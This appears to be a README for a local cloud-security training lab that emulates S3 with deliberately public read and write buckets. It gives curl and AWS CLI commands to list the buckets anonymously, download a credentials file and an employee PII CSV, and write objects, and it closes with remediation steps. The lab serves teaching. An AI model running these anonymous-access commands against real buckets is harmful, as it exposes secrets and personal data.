Cloud Lab 01. AWS-S3-Public-Loot — Flask (Python), self-contained  ✅ (exploit verified on this box)

A faithful, minimal S3 REST API with two misconfigured buckets. acme-public-assets
is world-readable (anonymous ListBucket + GetObject) and its bucket policy has
Principal "*", so anyone can enumerate and download the objects — including a
credentials.json (AWS keys), a DB dump, and a PII CSV. acme-uploads allows
anonymous PutObject, so an attacker can also write arbitrary objects (defacement /
malware hosting). Exploit with plain curl (or the AWS CLI, see below).

1: Get the lab:   unzip AWS-S3-Public-Loot.zip && cd 01-AWS-S3-Public-Loot
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9131/          <-- <ListAllMyBucketsResult>...</...>
   # Quick win — anonymous read + exfil + write:
   curl -s 'localhost:9131/acme-public-assets/?list-type=2'      # enumerate objects
   curl -s localhost:9131/acme-public-assets/config/credentials.json
   #   -> {"aws_access_key_id":"AKIAIOSFODNN7EXAMPLE","aws_secret_access_key":"..."}
   curl -s localhost:9131/acme-public-assets/employees.csv        # PII exfil
   curl -s 'localhost:9131/acme-public-assets/?policy'            # Principal:"*"
   # anonymous WRITE to the public-write bucket, then read it back:
   curl -s -X PUT --data 'pwned-by-anon' localhost:9131/acme-uploads/pwned.txt
   curl -s localhost:9131/acme-uploads/pwned.txt                  # -> pwned-by-anon
   # AWS CLI equivalent (where awscli is installed):
   #   aws --endpoint-url http://localhost:9131 --no-sign-request s3 ls s3://acme-public-assets
   #   aws --endpoint-url http://localhost:9131 --no-sign-request s3 cp s3://acme-public-assets/config/credentials.json -
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no AWS account)
    curl                            (AWS CLI optional, --no-sign-request)

Endpoints (S3-style):
    GET  /                                   -> ListAllMyBuckets
    GET  /<bucket>/?list-type=2               -> ListObjects            [public read]
    GET  /<bucket>/<key>                      -> GetObject              [public read]
    GET  /<bucket>/?policy                    -> GetBucketPolicy (shows Principal:"*")
    PUT  /<bucket>/<key>                      -> PutObject              [public write on acme-uploads]

List of Vulnerabilities (all verified on this box):
    Public S3 bucket (read) — acme-public-assets allows anonymous ListBucket +
        GetObject; bucket policy grants Principal "*".
    Sensitive data exposure — credentials.json (AWS keys), a DB dump, and a PII
        CSV are downloadable with no auth.
    Public S3 bucket (write) — acme-uploads allows anonymous PutObject, so an
        attacker can host/replace content.

Remediation: enable S3 Block Public Access; remove Principal "*" policies/ACLs;
scope reads/writes to specific principals; move secrets out of objects and rotate them.
